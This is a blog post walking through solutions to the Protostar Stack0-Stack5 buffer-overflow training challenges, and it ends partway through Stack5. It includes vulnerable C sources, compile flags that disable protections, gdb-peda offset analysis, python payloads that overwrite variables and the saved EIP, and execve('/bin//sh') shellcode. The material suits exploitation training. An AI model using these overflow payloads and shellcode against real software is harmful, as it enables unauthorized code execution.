---
title: Protostar Stack 0-7 Solutions
layout: post
date: '2021-03-30 15:45:40'
---


I solved those challenges in the past. However, it was more like a blackbox approach by finding the right offset and playing around with debuggers.
This time, I tried a bit harder in order to read asm more to calculate the offset and understanding more as you could see below.

You might be interested in the solution of the Challenge 5, I did not see a similar answer to mine yet.
Enjoy.

You can also find them on the link below.
[https://github.com/cemonatk/pwn-exercises](https://github.com/cemonatk/pwn-exercises)
## Protostar-Stack0 Solution

### 1. Introduction

This is a poc solution for the "Stack0" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170419082620/https://exploit-exercises.com/protostar/stack0/](https://web.archive.org/web/20170419082620/https://exploit-exercises.com/protostar/stack0/) 


**Hints:**
* This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

The if statement checks whether the variable "modified" is "**0**" (zero) or not. The goal of this challenge is to modify this variable and set its value to anything rather than "**0**" zero. 

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + without nx-bit + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o 0 0.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

1. Silently (-q) start with gdb.
2. Set intel syntax.
3. Disassemble the main function.

```nasm
$ gdb -q 0
Reading symbols from 0...
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080491b6 <+0>:	endbr32 
   0x080491ba <+4>:	lea    ecx,[esp+0x4]
   0x080491be <+8>:	and    esp,0xfffffff0
   0x080491c1 <+11>:	push   DWORD PTR [ecx-0x4]
   0x080491c4 <+14>:	push   ebp
   0x080491c5 <+15>:	mov    ebp,esp
   0x080491c7 <+17>:	push   ebx
   0x080491c8 <+18>:	push   ecx
   0x080491c9 <+19>:	sub    esp,0x50
   0x080491cc <+22>:	call   0x80490f0 <__x86.get_pc_thunk.bx>
   0x080491d1 <+27>:	add    ebx,0x2e2f
   0x080491d7 <+33>:	mov    DWORD PTR [ebp-0xc],0x0
   0x080491de <+40>:	sub    esp,0xc
   0x080491e1 <+43>:	lea    eax,[ebp-0x4c]
   0x080491e4 <+46>:	push   eax
   0x080491e5 <+47>:	call   0x8049070 <gets@plt>
   0x080491ea <+52>:	add    esp,0x10
   0x080491ed <+55>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080491f0 <+58>:	test   eax,eax
   0x080491f2 <+60>:	je     0x8049208 <main+82>
   0x080491f4 <+62>:	sub    esp,0xc
   0x080491f7 <+65>:	lea    eax,[ebx-0x1ff8]
   0x080491fd <+71>:	push   eax
   0x080491fe <+72>:	call   0x8049080 <puts@plt>
   0x08049203 <+77>:	add    esp,0x10
   0x08049206 <+80>:	jmp    0x804921a <main+100>
   0x08049208 <+82>:	sub    esp,0xc
   0x0804920b <+85>:	lea    eax,[ebx-0x1fcf]
   0x08049211 <+91>:	push   eax
   0x08049212 <+92>:	call   0x8049080 <puts@plt>
   0x08049217 <+97>:	add    esp,0x10
   0x0804921a <+100>:	mov    eax,0x0
   0x0804921f <+105>:	lea    esp,[ebp-0x8]
   0x08049222 <+108>:	pop    ecx
   0x08049223 <+109>:	pop    ebx
   0x08049224 <+110>:	pop    ebp
   0x08049225 <+111>:	lea    esp,[ecx-0x4]
   0x08049228 <+114>:	ret       
End of assembler dump.
```

Let's have a quick look at some parts of the output.

```nasm
   0x080491c1 <+11>:	push   DWORD PTR [ecx-0x4]
   0x080491c4 <+14>:	push   ebp
   0x080491c5 <+15>:	mov    ebp,esp
   0x080491c7 <+17>:	push   ebx
   0x080491c8 <+18>:	push   ecx
   0x080491c9 <+19>:	sub    esp,0x50
```
Since the stack grows to lower addresses, compiler used instruction **sub** to decrease the value in stack pointer by **0x50**.

```x86asm
gdb-peda$ p/d 0x50
80
```
So, 80 bytes for stack - 4 pushes = 64 bytes char array.

> 4*4 = 16

> 80 - 16 = 64

The char offset which has **64** bytes of length as I see.

It's also possible to estimate the offset length by using several approaches, but not limited to, Brute Force via terminal interaction (manually, bash, py...etc), py-gdb scripting, or checking stack via debugging.

Another calculation for the offset length.

```nasm
...
   0x080491d7 <+33>:	mov    DWORD PTR [ebp-0xc],0x0
   0x080491de <+40>:	sub    esp,0xc
   0x080491e1 <+43>:	lea    eax,[ebp-0x4c]
...
```

Since the stack grows to lower addresses, compiler decided to use the  instruction **sub** to decrease the value on stack pointer by **0xc** (12) .

```x86asm
gdb-peda$ p/d 0x4c
$1 = 76
gdb-peda$ p/d 0xc
$2 = 12
```

> 76-12 = 64

The funtion **gets()** doesn't check offset length while receiving a user-generated input. By exploiting this vulnerable function usage, it's possible to modify the variable **modified** the goal would be achieved. 

Recap the statement.

```c
if(modified != 0)
```

#### 2.2 Quick Solution

Let's set a breakpoint at addresses **0x08049212** and **0x080491fe** then run the program. Both are the addresses where  **puts** is called (**\<puts@plt\>**).

```nasm
gdb-peda$ b* 0x08049212
Breakpoint 1 at 0x8049212: file 0.c, line 16.
gdb-peda$ b * 0x080491fe
Breakpoint 2 at 0x80491fe: file 0.c, line 14.
```

```x86asm
gdb-peda$ r
Starting program: ./0 
AAAAAAAAA
...TRIM...
Breakpoint 1, 0x08049212 in main (argc=0x1, argv=0xffffd1f4) at 0.c:16
16	      printf("Try again?\n");
```

```x86asm
gdb-peda$ print modified
$1 = 0x0
```

Okay, the variable **modified** equals to **0x0** therefore it prints out "Try again?\n" message.

Let's use 65 uppercase "A" characters then observe output of the same commands. As we calculated the offset length as 64, the offset will be overwritten with this character hence modified is set to the following value.

```x86asm
gdb-peda$ r <<< $(python2 -c 'print "A"*65')
Starting program: /home/thomas/Desktop/protostar/0 <<< $(python2 -c 'print "A"*65')
...TRIM...
Breakpoint 2, 0x080491fe in main (argc=0x1, argv=0xffffd1f4) at 0.c:14
14	      printf("you have changed the 'modified' variable\n");
```
```x86asm
gdb-peda$ print modified
$3 = 0x41
```

It seems like it worked, a PoC in gdb-peda would be as follows.

```py
r <<< $(python2 -c 'print "A"*65')
```

#### 2.3 Final PoC

```py
$ python2 -c "print 'A'*65" | ./0
```

## Protostar-Stack1 Solution

### 1. Introduction

This is a poc solution for the "Stack1" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170419031559/https://exploit-exercises.com/protostar/stack1/](https://web.archive.org/web/20170419031559/https://exploit-exercises.com/protostar/stack1/) 

**Hints:**
* This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.
* If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
* Protostar is little endian.

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + without nx-bit + Disable canaries + Disable ASLR + for x86:


```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o 1 1.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

1. Silently (-q) start with gdb.
2. Set intel syntax.
3. Disassemble the main function.

```nasm
$ gdb -q 1
Reading symbols from 1...
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main
...
   0x0804924a <+84>:	call   0x80490a0 <strcpy@plt>
   0x0804924f <+89>:	add    esp,0x10
   0x08049252 <+92>:	mov    eax,DWORD PTR [ebp-0x1c]
=> 0x08049255 <+95>:	cmp    eax,0x61626364
   0x0804925a <+100>:	jne    0x8049270 <main+122>
...
```
Instructions shared above are quite interesting...
Uses strcpy, compares the value **"0x61626364"** and then jumps to address ***0x8049270** if it does not equal to the value on **eax** register.

Let's keep this one in our mind...
> 0x61626364

After an initial execution it's possible to understand it needs an argument from the terminal.

```js
$ ./1
1: please specify an argument
```

#### 2.2 Quick Solution

Let's set a breakpoint to address "0x08049252" then check what is there. 
```nasm
gdb-peda$ b *0x08049252
Breakpoint 1 at 0x8049252: file 1.c, line 18.
gdb-peda$ r AAAAAAAA
Starting program: /1 AAAAAAAA
[----------------------------------registers-----------------------------------]
EAX: 0xffffd0dc ("AAAAAAAA")
EBX: 0x804c000 --> 0x804bf14 --> 0x1 
ECX: 0xffffd3ac ("AAAAAAAA")
EDX: 0xffffd0dc ("AAAAAAAA")
ESI: 0xffffd150 --> 0x2 
EDI: 0xf7fb0000 --> 0x1ead6c 
EBP: 0xffffd138 --> 0x0 
ESP: 0xffffd0d0 --> 0x0 
EIP: 0x8049252 (<main+92>:	mov    eax,DWORD PTR [ebp-0x1c])
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[...DELETED...]

Breakpoint 1, main (argc=0x2, argv=0xffffd1e4) at 1.c:18
18	  if(modified == 0x61626364) {
```

> Since we compiled with debug symbols and we use peda, it's very easy to see...

So it checks if the value modified equals to **"0x61626364"** or not.

```x86asm
gdb-peda$ p/d 0x61
$32 = 97
gdb-peda$ p/d 0x62
$33 = 98
gdb-peda$ p/d 0x63
$34 = 99
gdb-peda$ p/d 0x64
$35 = 100
```
ASCII equivalent is **"dcba" (100 99 98 97)**. So we can send some kind of following payload:
[offset]+dcba or hex equivalent.

Run the binary again and let's see what happens:

```nasm
   0x0804924f <+89>:	add    esp,0x10
=> 0x08049252 <+92>:	mov    eax,DWORD PTR [ebp-0x1c]
   0x08049255 <+95>:	cmp    eax,0x61626364
```

Let's run it again then check what we have in that place **(ebp-0x1c)** with the following commands.

```nasm
gdb-peda$ r AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNPPPPOOOOXXXX
..trim..
gdb-peda$ x/wx $ebp-0x1c
0xffffd0ec:	0x58585858
```

To let this solution post shorter I didn't want to do same steps multiple times. So, we found our offset:
```x86asm
gdb-peda$ python-interactive print(len('AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNPPPPOOOOXXXX')-4)
64
```

**esp dump:**
```nasm
gdb-peda$ x/20xw $esp
0xffffd0a0:	0x00000000	0x00000000	0xf7ffd000	0x41414141<=First(A)
0xffffd0b0:	0x42424242	0x43434343	0x44444444	0x45454545
0xffffd0c0:	0x46464646	0x47474747	0x48484848	0x49494949
0xffffd0d0:	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c	0x4d4d4d4d
0xffffd0e0:	0x4e4e4e4e	0x50505050	0x4f4f4f4f  *0x58585858<=Target

gdb-peda$ c
Continuing.
Try again, you got 0x58585858
[Inferior 1 (process 7941) exited normally]
Warning: not running
```

I put 2 arrows in the output of **x/20xw $esp** command above.

*First*: Stands for the starting point of our input.

*Target*: Stands for the target place that we want to manipulate.

Our offset length will be = Target-First = 64


#### 2.3 PoC in gdb-peda:

```nasm
gdb-peda$ r $(python2 -c 'print "\x90"*64 + "\x64\x63\x62\x61"')

gdb-peda$ print modified
$1 = 0x61626364

gdb-peda$ x/wx $ebp-0x1c
0xffffd0ec:	0x61626364

gdb-peda$ x/20xw $esp
0xffffd0a0:	0x00000000	0x00000000	0xf7ffd000	0x90909090
0xffffd0b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd0c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd0d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd0e0:	0x90909090	0x90909090	0x90909090	0x61626364

gdb-peda$ c
Continuing.
you have correctly got the variable to the right value
[Inferior 1 (process 8471) exited normally]
Warning: not running
```

#### 2.3 Final PoC

```bash
$ ./1 `python2 -c 'print "\x90"*64 + "\x64\x63\x62\x61"'` 
you have correctly got the variable to the right value
```

## Protostar-Stack2 Solution

### 1. Introduction

This is a poc solution for the "Stack2" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170419023252/https://exploit-exercises.com/protostar/stack2/](https://web.archive.org/web/20170419023252/https://exploit-exercises.com/protostar/stack2/) 

**Hints:**
* Stack2 looks at environment variables, and how they can be set.

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + without nx-bit + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o 2 2.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

Okay, this challenge is pretty similar to Stack-1.
Hence I am not explaining again.

The only difference is the user-controlled env variable GREENIE is used in code and it is copied to "buffer" via strcpy(buffer, variable). The goal is same; etting the "modified" variable to 0x0d0a0d0a.

```bash
GREENIE=`python -c "print 'A' * 64 + '\x0a\x0d\x0a\x0d'"` ./2
you have correctly modified the variable
```

## Protostar-Stack3 Solution

### 1. Introduction

This is a poc solution for the "Stack3" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170417130221/https://exploit-exercises.com/protostar/stack3/](https://web.archive.org/web/20170417130221/https://exploit-exercises.com/protostar/stack3/) 

**Hints:**
*  Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)
* both gdb and objdump is your friend you determining where the win() function lies in memory.

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + without nx-bit + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o 3 3.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

1. Silently (-q) start with gdb.
2. Set intel syntax.
3. Disassemble the main function.
4. List functions.

```nasm
$ gdb -q 3
Reading symbols from 3...
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08049205 <+0>:	endbr32 
   0x08049209 <+4>:	lea    ecx,[esp+0x4]
   0x0804920d <+8>:	and    esp,0xfffffff0
   0x08049210 <+11>:	push   DWORD PTR [ecx-0x4]
   0x08049213 <+14>:	push   ebp
   0x08049214 <+15>:	mov    ebp,esp
   0x08049216 <+17>:	push   ebx
   0x08049217 <+18>:	push   ecx
   0x08049218 <+19>:	sub    esp,0x50
   0x0804921b <+22>:	call   0x8049110 <__x86.get_pc_thunk.bx>
   0x08049220 <+27>:	add    ebx,0x2de0
   0x08049226 <+33>:	mov    DWORD PTR [ebp-0xc],0x0
   0x0804922d <+40>:	sub    esp,0xc
   0x08049230 <+43>:	lea    eax,[ebp-0x4c]
   0x08049233 <+46>:	push   eax
   0x08049234 <+47>:	call   0x8049090 <gets@plt>
   0x08049239 <+52>:	add    esp,0x10
   0x0804923c <+55>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x08049240 <+59>:	je     0x804925c <main+87>
   0x08049242 <+61>:	sub    esp,0x8
   0x08049245 <+64>:	push   DWORD PTR [ebp-0xc]
   0x08049248 <+67>:	lea    eax,[ebx-0x1fd8]
   0x0804924e <+73>:	push   eax
   0x0804924f <+74>:	call   0x8049080 <printf@plt>
   0x08049254 <+79>:	add    esp,0x10
   0x08049257 <+82>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804925a <+85>:	call   eax
   0x0804925c <+87>:	mov    eax,0x0
   0x08049261 <+92>:	lea    esp,[ebp-0x8]
   0x08049264 <+95>:	pop    ecx
   0x08049265 <+96>:	pop    ebx
   0x08049266 <+97>:	pop    ebp
   0x08049267 <+98>:	lea    esp,[ecx-0x4]
   0x0804926a <+101>:	ret    
End of assembler dump.
```

Let's examine functions, **"info address win"** can also be useful

```c 
gdb-peda$ info functions
All defined functions:

File 3.c:
12:	int main(int, char **);
7:	void win(); <==Target to jump.

gdb-peda$ print win
$3 = {void ()} 0x80491d6 <win>
```

Goal is simple, jumping to **win()** function. We can achieve this goal by overwriting the **fp** with the address of **win()** function. 


Let's analyze a bit more the following part of the asm code.
```nasm
   0x08049257 <+82>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804925a <+85>:	call   eax
```

We are actually manipulating eax register to control program flow.
Let's set a breakpoint to just one previous instruction.

```x86asm
gdb-peda$ b *0x08049257
Breakpoint 1 at 0x8049257: file 3.c, line 23.
gdb-peda$ r
Starting program: /home/thomas/Desktop/protostar/3 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
calling function pointer, jumping to 0x61616161
...TRIM...
Breakpoint 1, main (argc=<error reading variable: Cannot access memory at address 0x61616161>, argv=<error reading variable: Cannot access memory at address 0x61616165>) at 3.c:23
23	
```

OK, we hit breakpoint let's examine fp() function, stack memory and registers a bit more.

```nasm
gdb-peda$ print fp
$1 = (int (*)()) 0x61616161
gdb-peda$ print &fp
$2 = (int (**)()) 0xffffd13c
gdb-peda$ p/d 0xc
$3 = 12
gdb-peda$ x/12wx $ebp-0xc
0xffffd13c:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd14c:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd15c:	0x61616161	0x61616161	0x61616161	0x61616161
gdb-peda$ i r
eax            0x30                0x30
```

OK **eax** is same because we need to run one more step to see the difference.

```nasm
gdb-peda$ si
...TRIM...
   0x8049257 <main+82>:	mov    eax,DWORD PTR [ebp-0xc]
=> 0x804925a <main+85>:	call   eax
   0x804925c <main+87>:	mov    eax,0x0
...TRIM...
gdb-peda$ i r eax
eax            0x61616161          0x61616161
```

Good, we manipulated the **eax** register. 



#### 2.2 Quick Solution

The function win() is at address **0x80491d6**, so our payload will have an offset + target address:

**buffsize * "\x90"** + **"\xd6\x91\x04\x08"**

Let's check the offset size with a different way that we didn't do on stack-1 solution.

Let's create a set of characters.

> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2A


```x86asm
gdb-peda$ r
Starting program: ./3 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2A
calling function pointer, jumping to 0x63413163
```
OK, **jumping to "0x63413163"**, therefore offset is **64**.


```nasm
gdb-peda$ r <<< $(python2 -c 'print "\x90"*64 + "\xd6\x91\x04\x08"')
Starting program: ./3 <<< $(python2 -c 'print "\x90"*64 + "\xd6\x91\x04\x08"')
calling function pointer, jumping to 0x080491d6
code flow successfully changed
```

#### 2.3 Final PoC

```nasm
$ python -c "print 'A' * 64 + '\xd6\x91\x04\x08'" | ./3
calling function pointer, jumping to 0x080491d6
code flow successfully changed
Segmentation fault (core dumped)
```

## Protostar-Stack4 Solution

### 1. Introduction

This is a poc solution for the "Stack4" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.
Note: I switched to ubuntu 14.04 from 20.04 from this chapter...

Source:
[https://web.archive.org/web/20170417130121/https://exploit-exercises.com/protostar/stack4/](https://web.archive.org/web/20170417130121/https://exploit-exercises.com/protostar/stack4/) 
 
**Hints:**
* Stack4 takes a look at overwriting saved EIP and standard buffer overflows.
* A variety of introductory papers into buffer overflows may help.
* gdb lets you do “run < input”
* EIP is not directly after the end of buffer, compiler padding can also increase the size.

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + without nx-bit + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o 4 4.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

1. Silently (-q) start with gdb.
2. Disassemble the main function.
3. Checking target function (win).

```nasm
$ gdb -q 4
Reading symbols from 4...done.
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048461 <+0>:	push   ebp
   0x08048462 <+1>:	mov    ebp,esp
   0x08048464 <+3>:	and    esp,0xfffffff0
   0x08048467 <+6>:	sub    esp,0x50
   0x0804846a <+9>:	lea    eax,[esp+0x10]
   0x0804846e <+13>:	mov    DWORD PTR [esp],eax
   0x08048471 <+16>:	call   0x8048310 <gets@plt>
   0x08048476 <+21>:	leave  
   0x08048477 <+22>:	ret    
End of assembler dump.

gdb-peda$ print win
$1 = {void ()} 0x804844d <win>

```

The steps for checking the offset size is explained in my previous posts. 
Basically when a function is called, the current state should be pushed into stack and when the called function ends they are **pop**ed from stack into registers again. These steps aka. x86 calling conventions are explained a bit more detailed in notes.md file. 

Instruction pointer (eip register) holds the next address to be executed.


#### 2.2 Quick Solution
 
This one is similar to stack-3 but a bit different. Let's check the offset size by using peda that we didn't use on previous solutions.

Let's create a set of characters. Copy the generated pattern then paste it to input.

```nasm
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

gdb-peda$ r
Starting program: ./4 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd0e0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBX: 0xf7fbc000 --> 0x1a9da8 
ECX: 0xfbad2288 
EDX: 0xf7fbd8a4 --> 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x65414149 ('IAAe')
ESP: 0xffffd130 ("AJAAfAA5AAKAAgAA6AAL")
EIP: 0x41344141 ('AA4A')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41344141
[------------------------------------stack-------------------------------------]
0000| 0xffffd130 ("AJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd134 ("fAA5AAKAAgAA6AAL")
0008| 0xffffd138 ("AAKAAgAA6AAL")
0012| 0xffffd13c ("AgAA6AAL")
0016| 0xffffd140 ("6AAL")
0020| 0xffffd144 --> 0xffffd100 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffd148 --> 0xffffd164 --> 0xcd02bd8c 
0028| 0xffffd14c --> 0x804a018 --> 0xf7e2b9e0 (<__libc_start_main>:	push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41344141 in ?? ()

```

### Let's check the offset by using peda

```x86asm
gdb-peda$ i r ebp
ebp            0x65414149	0x65414149

gdb-peda$ pattern offset 0x65414149
1698775369 found at offset: 72
```

```x86asm
gdb-peda$ print $eip
$1 = (void (*)()) 0x41344141
gdb-peda$ pattern offset 0x41344141
1093943617 found at offset: 76
```

So we need 72 bytes of junk (let's use nops - \x90). Since the base pointer also stored in the stack righ after esp we need to overwrite ebp as well to control program flow and 4 bytes for ebp as well.

Here is the summary of our attempt with the pattern:

```js
"\x90" * 72       -> Offset
"BBBB"            -> ebp
address of win()  -> eip
```

```py
gdb-peda$ r <<< $(python -c "print '\x90' * 72 + 'BBBB' + '\x4d\x84\x04\x08'")
Starting program: ./4 <<< $(python -c "print '\x90' * 72 + 'BBBB' + '\x4d\x84\x04\x08'")
code flow successfully changed
Program received signal SIGSEGV, Segmentation fault.
...trim...

gdb-peda$ i r ebp
ebp            0x42424242	0x42424242
```

#### 2.3 Final PoC

```py
python -c "print '\x90' * 76 + '\x4d\x84\x04\x08'" | ./4
```


## Protostar-Stack5 Solution

### 1. Introduction

This is a poc solution for the "Stack5" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look. Thanks to my friend for his help in this challenge, the solution in this post is smooth.

Source:
[https://web.archive.org/web/20170419023355/https://exploit-exercises.com/protostar/stack5/](https://web.archive.org/web/20170419023355/https://exploit-exercises.com/protostar/stack5/) 
 
**Hints:**
* Stack5 is a standard buffer overflow, this time introducing shellcode.
* At this point in time, it might be easier to use someone elses shellcode
* If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
* remove the int3s once your shellcode is done.


#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + without nx-bit + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o 5 5.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

1. Silently (-q) start with gdb.
2. Disassemble the main function.

```nasm
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0804841d <+0>:	push   ebp
   0x0804841e <+1>:	mov    ebp,esp
   0x08048420 <+3>:	and    esp,0xfffffff0
   0x08048423 <+6>:	sub    esp,0x50
   0x08048426 <+9>:	lea    eax,[esp+0x10]
   0x0804842a <+13>:	mov    DWORD PTR [esp],eax
   0x0804842d <+16>:	call   0x80482f0 <gets@plt>
   0x08048432 <+21>:	leave  
   0x08048433 <+22>:	ret    
End of assembler dump. 
```
 
This challenge seems to be similar to stack-4, only difference is we need to execute our shellcode. Offset is also same...


Let's set a breakpoint on **0x08048432**, one instruction before return of the main().

```nasm
gdb-peda$ b * 0x08048432
Breakpoint 1 at 0x8048432: file 5.c, line 11.

gdb-peda$ r 

gdb-peda$ ni
...TRIM...
EAX: 0xffffd0e0 ('A' <repeats 76 times>, "BBBBCCCCDDDD")
...
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd130 ("CCCCDDDD")
EIP: 0x42424242 ('BBBB')
...TRIM...
Invalid $PC address: 0x42424242
...TRIM...
0x42424242 in ?? ()
```

As seen above, registers eax, esp, eip, ebp are overwritten. The goal of this challenge is to obtain a command execution on target host. So we need to let target jump to our shellcode. As seen above, it's possible to write our shellcode to several places. I chose **eax** register at this time. 

#### 2.2 Quick Solution

Let's write a basic shellcode (exploit.asm).

```nasm
section .text
	global _start

_start:
	xor eax, eax ; cleaning up -> safe null
	push eax ; null-byte onto stack since it's a terminator
	push 'n/sh' ; //bi + n/sh -> 4 + 4 bytes since '//'=='/'
	push '//bi' 
	mov ebx, esp ; set ebx to out
	xor ecx, ecx ; cleaning up -> no args 
	xor edx, edx ; cleaning up -> no args
	mov al, 11 ; syscall  ->  execve()
	int 80h ; call kernel
```


Compiling our shellcode.

```
$ cat Makefile
all:
	nasm -f elf32 exploit.asm -o exploit.o
	ld -m elf_i386 exploit.o -o exploit
	rm exploit.o
	objcopy -O binary exploit exploit.bin

$ make
```

By help of **objcopy**, we copied the **.text section** in raw-hex format into the **exploit.bin** file.

```nasm
$ objdump -D exploit -M intel

exploit:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	31 c0                	xor    eax,eax
 8048062:	50                   	push   eax
 8048063:	68 6e 2f 73 68       	push   0x68732f6e
 8048068:	68 2f 2f 62 69       	push   0x69622f2f
 804806d:	89 e3                	mov    ebx,esp
 804806f:	31 c9                	xor    ecx,ecx
 8048071:	31 d2                	xor    edx,edx
 8048073:	b0 0b                	mov    al,0xb
 8048075:	cd 80                	int    0x80
```

As seen on command output below, 23 bytes of shellcode is written in exploit.bin file in raw hex format.

```x86asm
$ ls -l exploit.bin 
-rwxrwxr-x 1 c c 23 Mar  1 04:21 exploit.bin

$ hexdump -v exploit.bin
0000000 c031 6850 2f6e 6873 2f68 622f 8969 31e3
0000010 31c9 b0d2 cd0b 0080
```

We need some padding with 76 bytes of data as an offset, therefore whatever is written after those bytes will be written onto **eip** register.

```x86asm
